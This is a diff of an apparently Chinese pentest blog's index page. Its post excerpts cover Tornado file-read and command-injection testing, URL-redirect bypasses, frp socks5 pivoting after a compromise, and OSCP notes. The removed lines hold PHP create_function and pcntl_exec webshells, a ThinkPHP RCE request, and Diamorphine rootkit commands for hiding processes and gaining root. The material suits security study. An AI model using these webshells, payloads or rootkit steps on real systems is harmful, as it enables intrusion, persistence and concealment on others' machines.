@@ -117,6 +117,304 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2019/06/18/tornado-pentest.html" >记一次测试Tornado</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-06-18  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>常见越权测试完了之后，有一个上传文件的地方，上传的文件名存在反射xss，主要记录下任意文件读取和远程命令执行。</p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ol>
+<li><p>刚开始测试任意文件读取的时候，找不到要读取的文件，问了开发目录结构才读出来，好蠢。实际可以通过<code>/proc/self/cmdline</code> 查看当前程序的运行参数，可以获取到源代码文件名。</p>
+</li>
+<li><p>一般python开发的时候，根目录可能存在文件: <code>README.md</code>,<code>requirements.txt</code>,<code>app.py</code>,<code>.git/config</code>之类的文件</p>
+</li>
+</ol>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>读取到源代码之后，中间有不一部分的代码是这样的，接收请求传过来的参数，然后列目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">res &#x3D; exec_cmd4(&quot;ls -l %s|awk &#39;&#123;print $5&#125;&#39;&quot; % abs_file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>exec_cmd4是开发自己写的函数，通过任意文件读取可以找到函数定义:</p>
+<pre class="line-numbers language-none"><code class="language-none">def exec_cmd4(cmd, no_print&#x3D;False):    
+	if not no_print:        
+		logger.debug(cmd)    
+		p &#x3D; subprocess.Popen(cmd, executable&#x3D;\&quot;&#x2F;bin&#x2F;bash\&quot;, shell&#x3D;True, stderr&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE)    
+		return p.communicate();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里存在命令注入漏洞，链接: <a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/787/">https://strcpy.me/index.php/archives/787/</a></p>
+<p>抄一下demo代码:</p>
+	
+
+	</div>
+  <a type="button" href="/2019/06/18/tornado-pentest.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>常见越权测试完了之后，有一个上传文件的地方，上传的文件名存在反射xss，主要记录下任意文件读取和远程命令执行。</p>
+<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><ol>
+<li><p>刚开始测试任意文件读取的时候，找不到要读取的文件，问了开发目录结构才读出来，好蠢。实际可以通过<code>/proc/self/cmdline</code> 查看当前程序的运行参数，可以获取到源代码文件名。</p>
+</li>
+<li><p>一般python开发的时候，根目录可能存在文件: <code>README.md</code>,<code>requirements.txt</code>,<code>app.py</code>,<code>.git/config</code>之类的文件</p>
+</li>
+</ol>
+<h3 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h3><p>读取到源代码之后，中间有不一部分的代码是这样的，接收请求传过来的参数，然后列目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">res &#x3D; exec_cmd4(&quot;ls -l %s|awk &#39;&#123;print $5&#125;&#39;&quot; % abs_file_name)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>exec_cmd4是开发自己写的函数，通过任意文件读取可以找到函数定义:</p>
+<pre class="line-numbers language-none"><code class="language-none">def exec_cmd4(cmd, no_print&#x3D;False):    
+	if not no_print:        
+		logger.debug(cmd)    
+		p &#x3D; subprocess.Popen(cmd, executable&#x3D;\&quot;&#x2F;bin&#x2F;bash\&quot;, shell&#x3D;True, stderr&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE)    
+		return p.communicate();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里存在命令注入漏洞，链接: <a target="_blank" rel="noopener" href="https://strcpy.me/index.php/archives/787/">https://strcpy.me/index.php/archives/787/</a></p>
+<p>抄一下demo代码:</p>
+	
+	</div>
+  <a type="button" href="/2019/06/18/tornado-pentest.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/05/27/web-url-hacking.html" >Web的URL Hacking</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-05-27  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>碰到一个任意URL跳转漏洞，第一次测的时候居然没有测出来，记录下笔记，以下是绕过的方式:</p>
+<h3 id="0x01-小老鼠跳转绕过"><a href="#0x01-小老鼠跳转绕过" class="headerlink" title="0x01: 小老鼠跳转绕过"></a>0x01: 小老鼠跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589534351266.jpg"></p>
+<h3 id="0x02-跳转绕过"><a href="#0x02-跳转绕过" class="headerlink" title="0x02: ?跳转绕过"></a>0x02: ?跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589535373195.jpg"></p>
+<h3 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03: #绕过"></a>0x03: #绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537014838.jpg"></p>
+<h3 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04: /绕过"></a>0x04: /绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537987606.jpg"></p>
+<h3 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05: \绕过"></a>0x05: \绕过</h3>
+	
+
+	</div>
+  <a type="button" href="/2019/05/27/web-url-hacking.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>碰到一个任意URL跳转漏洞，第一次测的时候居然没有测出来，记录下笔记，以下是绕过的方式:</p>
+<h3 id="0x01-小老鼠跳转绕过"><a href="#0x01-小老鼠跳转绕过" class="headerlink" title="0x01: 小老鼠跳转绕过"></a>0x01: 小老鼠跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589534351266.jpg"></p>
+<h3 id="0x02-跳转绕过"><a href="#0x02-跳转绕过" class="headerlink" title="0x02: ?跳转绕过"></a>0x02: ?跳转绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589535373195.jpg"></p>
+<h3 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03: #绕过"></a>0x03: #绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537014838.jpg"></p>
+<h3 id="0x04-绕过"><a href="#0x04-绕过" class="headerlink" title="0x04: /绕过"></a>0x04: /绕过</h3><p><img src="/2019/05/27/web-url-hacking/15589537987606.jpg"></p>
+<h3 id="0x05-绕过"><a href="#0x05-绕过" class="headerlink" title="0x05: \绕过"></a>0x05: \绕过</h3>
+	
+	</div>
+  <a type="button" href="/2019/05/27/web-url-hacking.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/05/08/frps.html" >frps的socks5代理</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-05-08  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
+<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
+<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
+<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
+<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
+
+[common]
+bind_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+dashboard_port &#x3D; [port]
+dashboard_user &#x3D; [user]
+dashboard_pwd &#x3D; [password]
+use_encryption &#x3D; true
+use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
+<pre class="line-numbers language-none"><code class="language-none">frpc.ini
+
+[common]
+server_addr &#x3D; [vps ip]
+server_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+
+
+[socks5]
+type &#x3D; tcp
+remote_port &#x3D; [port]
+plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>在PHP的网站getshell之后，有一个比较大的B段内网，测试了一下几个代理都不太好用，最后试了frps，ngrok还没测试。</p>
+<p>首先是reGeorg,如果是Linux的话需要上传no-socket的文件，但是实际测试，网站打开特别慢。 pass</p>
+<p>其次是ew，之前在windows上面测试过ew，效果还不错，不过没有扫描比较大的局域网。这次测试了下，中间扫到一半出现了段错误。pass</p>
+<p>最后试frps，实际效果不错，至少可以解决问题了。配置文件这样的:</p>
+<pre class="line-numbers language-none"><code class="language-none">frps.ini: 
+
+[common]
+bind_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+dashboard_port &#x3D; [port]
+dashboard_user &#x3D; [user]
+dashboard_pwd &#x3D; [password]
+use_encryption &#x3D; true
+use_compression &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>上面试在vps上面启动，会在对应端口开一个web服务，看到已经启动的流量和节点存活</p>
+<pre class="line-numbers language-none"><code class="language-none">frpc.ini
+
+[common]
+server_addr &#x3D; [vps ip]
+server_port &#x3D; 10086
+privilege_token &#x3D; [passwd]
+max_pool_count &#x3D; 50
+
+
+[socks5]
+type &#x3D; tcp
+remote_port &#x3D; [port]
+plugin &#x3D; socks5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这个在被控制主机上启动，运行完之后，vps的remote_port端口就会开一个socks5的代理，这样就进入到被控主机的网络里面。nmap扫描要带上<code>-sT -Pn</code>选项。</p>
+
+	
+	</div>
+  <a type="button" href="/2019/05/08/frps.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/04/02/OSCP-experience.html" >OSCP经验</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-04-02  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
+uth-user-pass auth.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
+<p>具体网络不稳定有两个表现:</p>
+<ol>
+<li>nmap扫描全部的端口长时间没有反应.</li>
+<li>dirbuster扫描的时候会卡死进行不下去了.</li>
+</ol>
+<p>上面两个问题有两个解决方法:</p>
+<ol>
+<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
+<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
+</ol>
+<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
+<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
+	
+
+	</div>
+  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h2 id="0x01-网络问题"><a href="#0x01-网络问题" class="headerlink" title="0x01: 网络问题"></a>0x01: 网络问题</h2><pre class="line-numbers language-none"><code class="language-none">socks-proxy 127.0.0.1 6876
+uth-user-pass auth.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>在openvpn的配置文件里面，我加了上面两行。<br>第一行因为国内网络不稳定，我加了ss的代理，后来换成了v2ray.<br>第二行是理由同上，因为网络不稳定，每次连接VPN都要输入用户密码，这样方便点.</p>
+<p>具体网络不稳定有两个表现:</p>
+<ol>
+<li>nmap扫描全部的端口长时间没有反应.</li>
+<li>dirbuster扫描的时候会卡死进行不下去了.</li>
+</ol>
+<p>上面两个问题有两个解决方法:</p>
+<ol>
+<li>nmap换成<a target="_blank" rel="noopener" href="https://github.com/AnthraX1/InsightScan">https://github.com/AnthraX1/InsightScan</a>, 先用单文件扫描全部的开放端口，然后用nmap扫描开放端口服务: <code>nmap -sS -sV -sC &lt;IP&gt; -p &lt;PORT&gt;</code></li>
+<li>dirbuster换成gobuster，词典不变，线程控制在25个左右.</li>
+</ol>
+<h2 id="0x02-报告问题"><a href="#0x02-报告问题" class="headerlink" title="0x02: 报告问题"></a>0x02: 报告问题</h2><p>我的报告格式和下面这个人的差不多。如果可以尽量使用官方的模版就用官方的模版，不然容易凉，我写了50多页的报告，做了4道半题目。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html">https://www.cnblogs.com/xiaoxiaoleo/p/9040339.html</a></p>
+<h2 id="0x03-监考问题"><a href="#0x03-监考问题" class="headerlink" title="0x03: 监考问题"></a>0x03: 监考问题</h2>
+	
+	</div>
+  <a type="button" href="/2019/04/02/OSCP-experience.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2019/03/01/hashcat.html" >Hashcat笔记</a>
 		</h3>
 		</div>
@@ -225,434 +523,6 @@ hash.txt 就是上面的NT-HASH
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2019/01/10/create_function.html" >create_function</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2019-01-10  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
-<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
-<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
-  eval(&quot;
-    function lambda_1 ($args) &#123; $code &#125;
-  &quot;);
-  return &#39;lambda_1&#39;;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
-<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
-  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
-&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
-<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
-	
-
-	</div>
-  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>p神在小密圈提了一个create_function的tips,就照之前的来说一句话:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php $sl &#x3D; create_function(&#39;&#39;, @$_REQUEST[&#39;pass&#39;]);$sl();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>只需要单独一个create_function就可以执行函数,搜了下发现在很早的时候80sec提过这个问题:<a target="_blank" rel="noopener" href="https://www.securityfocus.com/archive/1/496728">https://www.securityfocus.com/archive/1/496728</a></p>
-<p>不过说的主要是第二个参数可控的情况下。原理来说很简单,create_function是类似这样的一个函数:</p>
-<pre class="line-numbers language-none"><code class="language-none">function create_function($args, $code) &#123;
-  eval(&quot;
-    function lambda_1 ($args) &#123; $code &#125;
-  &quot;);
-  return &#39;lambda_1&#39;;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>所以在第二个参数可控的情况下闭合大括号<code>return 0; &#125; echo &#39;outside&#39;; //</code>，就可以执行:</p>
-<pre class="line-numbers language-none"><code class="language-none">eval(&quot;
-  function lambda_1 () &#123; return 0; &#125; echo &#39;outside&#39;; &#x2F;&#x2F; &#125;
-&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-<p>第一个可控的情况下,这样就可以执行phpinfo:</p>
-<pre class="line-numbers language-none"><code class="language-none">create_function(&#39;)&#123;&#125;phpinfo();&#x2F;&#x2F;&#39;, &#39;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>可以放gdb里面直接调试下,在php源代码里面搜索create_function的实现，然后打断点就可以调试出来:</p>
-	
-	</div>
-  <a type="button" href="/2019/01/10/create_function.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2018/12/18/pcntl_exec.html" >pcntl_exec</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2018-12-18  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>2019.8.1更新</p>
-<p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</defunc></p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-
-&#x2F;**
- * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
- *&#x2F;
-
-&#x2F;&#x2F;生成子进程
-$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
-$pid &#x3D; pcntl_fork();
-if($pid &#x3D;&#x3D; -1)&#123;
-    die(&#39;could not fork&#39;);
-&#125;else&#123;
-    if($pid)&#123;
-        $status &#x3D; 0;
-        pcntl_exec($cmd[0], $cmd[1]);
-        posix_kill(getmypid(),9);
-&#x2F;&#x2F;阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
-        &#x2F;&#x2F;可使用pcntl_wait($status, WNOHANG)实现非阻塞式
-
-        pcntl_wait($status);
-        exit;
-    &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
-<p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p>
-<hr>
-<pre class="line-numbers language-none"><code class="language-none">参数执行:
-pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;返回值可能是502
-
-执行脚本:
-pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;返回值502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">返回值200
-&lt;?php
-$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
-if(function_exists(&#39;pcntl_exec&#39;)) &#123;
-    switch(pcntl_fork())&#123;
-     case 0:
-        pcntl_exec($cmd[0], $cmd[1]);
-    default:
-          echo &quot;case 111&quot;;
-    &#125;
-&#125; else &#123;
-        echo &#39;不支持pcntl扩展&#39;;
-&#125;
-?&gt;
-
-
-cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt
-
-&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<pre class="line-numbers language-none"><code class="language-none">
-&lt;?php
-header(&quot;Content-Type: text&#x2F;plain&quot;);
-$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
-@unlink($cmd);
-@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
-$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
-file_put_contents($cmd, $c);
-chmod($cmd, 0777);
-
-switch (pcntl_fork()) &#123;
-  case 0:
-    $ret &#x3D; pcntl_exec($cmd);
-    exit(&quot;case 0&quot;);
-  default:
-    echo &quot;case 1&quot;;
-    break;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>上面执行的脚本那行chmod不可以少</p>
-	
-
-	</div>
-  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>2019.8.1更新</p>
-<p>这样子执行完就不会多出来<defunc>的进程，也不会多出来<code>php-fpm</code>进程:</defunc></p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-
-&#x2F;**
- * 子进程通过信号kill自己,也可以在父进程中发送kil信号结束子进程
- *&#x2F;
-
-&#x2F;&#x2F;生成子进程
-$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
-$pid &#x3D; pcntl_fork();
-if($pid &#x3D;&#x3D; -1)&#123;
-    die(&#39;could not fork&#39;);
-&#125;else&#123;
-    if($pid)&#123;
-        $status &#x3D; 0;
-        pcntl_exec($cmd[0], $cmd[1]);
-        posix_kill(getmypid(),9);
-&#x2F;&#x2F;阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
-        &#x2F;&#x2F;可使用pcntl_wait($status, WNOHANG)实现非阻塞式
-
-        pcntl_wait($status);
-        exit;
-    &#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
-<p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p>
-<hr>
-<pre class="line-numbers language-none"><code class="language-none">参数执行:
-pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;返回值可能是502
-
-执行脚本:
-pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;返回值502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-none"><code class="language-none">返回值200
-&lt;?php
-$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
-if(function_exists(&#39;pcntl_exec&#39;)) &#123;
-    switch(pcntl_fork())&#123;
-     case 0:
-        pcntl_exec($cmd[0], $cmd[1]);
-    default:
-          echo &quot;case 111&quot;;
-    &#125;
-&#125; else &#123;
-        echo &#39;不支持pcntl扩展&#39;;
-&#125;
-?&gt;
-
-
-cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt
-
-&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<pre class="line-numbers language-none"><code class="language-none">
-&lt;?php
-header(&quot;Content-Type: text&#x2F;plain&quot;);
-$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
-@unlink($cmd);
-@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
-$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
-file_put_contents($cmd, $c);
-chmod($cmd, 0777);
-
-switch (pcntl_fork()) &#123;
-  case 0:
-    $ret &#x3D; pcntl_exec($cmd);
-    exit(&quot;case 0&quot;);
-  default:
-    echo &quot;case 1&quot;;
-    break;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>上面执行的脚本那行chmod不可以少</p>
-	
-	</div>
-  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2018/07/18/lkm-rootkit.html" >LKM Rootkit</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2018-07-18  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,支持内核2.6.x/3.x/4.x</p>
-<p>编译安装:</p>
-<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
-cd Diamorphine
-make
-insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>在<code>diamorphine.h</code>里面定义了<code>MAGIC_PREFIX</code>, 可以自己修改为任意其他东西，比如<code>xx</code>，然后以xx为开头的文件就回全部隐身啦</p>
-<pre class="line-numbers language-none"><code class="language-none">kill -63 0  隐藏(显示) rootkit模块
-rmmod diamorphine   删除rootkit
-kill -64 0  从任意用户切换到root用户
-kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
